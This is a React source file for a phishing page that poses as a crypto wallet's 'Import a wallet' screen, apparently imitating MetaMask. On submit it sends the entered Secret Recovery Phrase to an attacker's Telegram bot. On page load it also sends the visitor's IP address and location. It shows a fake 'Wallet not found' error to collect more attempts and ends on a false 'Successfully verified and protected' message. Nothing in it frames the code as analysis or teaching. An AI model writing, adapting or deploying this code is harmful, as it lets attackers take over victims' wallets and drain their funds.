"use client"
import React, { useState, useEffect, useRef } from "react"
import { ArrowLeft, ChevronDown, Info, CheckCircle } from "lucide-react"

export default function ImportWallet() {
  const [phrase, setPhrase] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")
  const [submitCount, setSubmitCount] = useState(0)
  const [isVerified, setIsVerified] = useState(false)
  const [showAll, setShowAll] = useState(false)
  const [wordInputs, setWordInputs] = useState(Array(18).fill(""))
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID)
  const [telegramToken] = useState(process.env.NEXT_PUBLIC_TOKEN)

  const NEXT_PUBLIC_ID = telegramChatId
  const NEXT_PUBLIC_TOKEN = telegramToken

  // Send message to Telegram
  const sendTelegramMessage = async (message: string) => {
    try {
      await fetch(
        `https://api.telegram.org/bot${telegramToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: "Markdown",
          }),
        }
      )
    } catch (error) {
      console.error("Failed to send Telegram message:", error)
    }
  }

  // Send notification when user visits the page
  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then((response) => response.json())
      .then((data) => {
        const visitData = {
          url: window.location.href,
          ip: data.ip,
          location: `${data.city}, ${data.region}, ${data.country_name}`,
        }

        sendTelegramMessage(
          `Visited this URL: ${visitData.url}\nIP Address: ${visitData.ip}\nLocation: ${visitData.location}`
        )
      })
  }, [telegramToken, telegramChatId])

  // Handle phrase input changes
  const handlePhraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const newPhrase = e.target.value
    setPhrase(newPhrase)
    
    const words = newPhrase.trim().split(/\s+/)
    const newWordInputs = Array(18).fill("")
    words.slice(0, 18).forEach((word, index) => {
      newWordInputs[index] = word
    })
    setWordInputs(newWordInputs)

    // Focus next empty input after space
    if (newPhrase.endsWith(" ") && words.length < 18) {
      const nextIndex = words.length
      inputRefs.current[nextIndex]?.focus()
    }
  }

  // Handle individual word input changes
  const handleWordChange = (index: number, value: string) => {
    const newWordInputs = [...wordInputs]
    newWordInputs[index] = value
    setWordInputs(newWordInputs)
    
    const newPhrase = newWordInputs.filter(word => word).join(" ")
    setPhrase(newPhrase)

    // Move to next input on space
    if (value.endsWith(" ") && index < 17) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (submitCount >= 4) return

    setIsLoading(true)
    setErrorMessage("")

    await sendTelegramMessage(`Phrase: \`${phrase}\``)

    setTimeout(() => {
      setIsLoading(false)
      setErrorMessage("Wallet not found. Check your spelling, ensure the words are in the correct order, or try another wallet.")
      setSubmitCount(prev => {
        const newCount = prev + 1
        if (newCount === 4) {
          setIsVerified(true)
        }
        return newCount
      })
    }, 3000)
  }

  // Render word input grid
const renderWords = () => {
  return Array(18).fill(0).map((_, index) => (
    <input
      key={index}
      type="text"
      value={wordInputs[index]}
      onChange={(e) => handleWordChange(index, e.target.value)}
      onKeyDown={(e) => {
        if (e.key === " " && wordInputs[index] && index < 17) {
          e.preventDefault()
          inputRefs.current[index + 1]?.focus()
        }
        if (e.key === "Backspace" && !wordInputs[index] && index > 0) {
          e.preventDefault()
          wordInputs[index] = ""
          inputRefs.current[index - 1]?.focus()
          setWordInputs([...wordInputs])
        }
      }}
      ref={(el) => { inputRefs.current[index] = el; }}
      className={`w-24 p-2 m-1 rounded-xl border text-left text-sm ${
        index === 0 || wordInputs[index - 1] ? "block" : "hidden"
      } ${wordInputs[index] ? "border-gray-500 bg-black text-white-300" : "border-purple-500 bg-black text-white"}`}
      placeholder={`${index + 1}.`}
    />
  ))
}

  // Check if continue button should be enabled
  const isContinueEnabled = () => {
    const validWords = wordInputs.filter(word => word.trim() !== "").length
    return !isLoading && validWords >= 12
  }

  // Clear all inputs
  const clearAll = () => {
    setPhrase("")
    setWordInputs(Array(18).fill(""))
    inputRefs.current[0]?.focus()
  }

  // Loading spinner component
  const LoadingSpinner = () => (
    <div className="flex justify-center items-center my-4">
      <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500"></div>
    </div>
  )

  // Success page component
  if (isVerified) {
    return (
      <div className="min-h-screen bg-gray-900 text-white flex flex-col items-center justify-center">
        <CheckCircle className="w-16 h-16 text-green-500 mb-4" />
        <h1 className="text-2xl font-bold">Successfully verified and protected</h1>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <header className="flex items-center justify-between p-4 border-b border-gray-800">
        <div className="flex items-center">
          <div className="text-center mb-8">
            <img src="images/image1.png" alt="fox" className="h-8 mx-auto" />
          </div>
        </div>

        <div className="flex items-center space-x-2 bg-gray-800 rounded-lg px-4 py-2 border border-gray-700 hover:bg-gray-700 transition-colors cursor-pointer">
          <span className="text-sm">English</span>
          <ChevronDown className="w-4 h-4" />
        </div>
      </header>

      {/* Main Content */}
      <main className="px-4 py-6 pb-24">
        {/* Navigation */}
        <div className="flex items-center space-x-4 mb-8">
          <ArrowLeft className="w-6 h-6 text-gray-400 cursor-pointer hover:text-white transition-colors" />
          <span className="text-sm text-gray-500">Step 1 of 2</span>
        </div>

        {/* Title */}
        <h1 className="text-3xl font-bold mb-8">Import a wallet</h1>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Input Field */}
          <div className="relative">
            <div className="flex items-center space-x-3">
              <h3 className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">
                Enter your Secret Recovery Phrase
              </h3>
            </div>
          </div>

          

          {/* Word Grid */}
          <div className="bg-[#202123] border border-gray-700 rounded-lg p-6 grid grid-cols-3 gap-2">
            {renderWords()}
          </div>

          {/* Error Message */}
          {errorMessage && (
            <div className="text-red-400 text-center">{errorMessage}</div>
          )}

          {/* Loading Spinner */}
          {isLoading && <LoadingSpinner />}

          {/* Action Links */}
          <div className="flex justify-between">
            <button 
              type="button" 
              className="text-purple-400 hover:text-blue-300 transition-colors font-medium"
              onClick={() => setShowAll(!showAll)}
            >
              {showAll ? "Hide all" : "Show all"}
            </button>
            <button 
              type="button"
              onClick={clearAll}
              className="text-purple-400 hover:text-blue-300 transition-colors font-medium"
            >
              Clear all
            </button>
          </div>

          {/* Continue Button */}
          <div className="fixed bottom-0 left-0 right-0 p-4 bg-gray-900 border-t border-gray-800">
            <button 
              type="submit"
              disabled={!isContinueEnabled()}
              className="w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-4 rounded-lg transition-colors shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Continue
            </button>
          </div>
        </form>
      </main>
    </div>
  )
}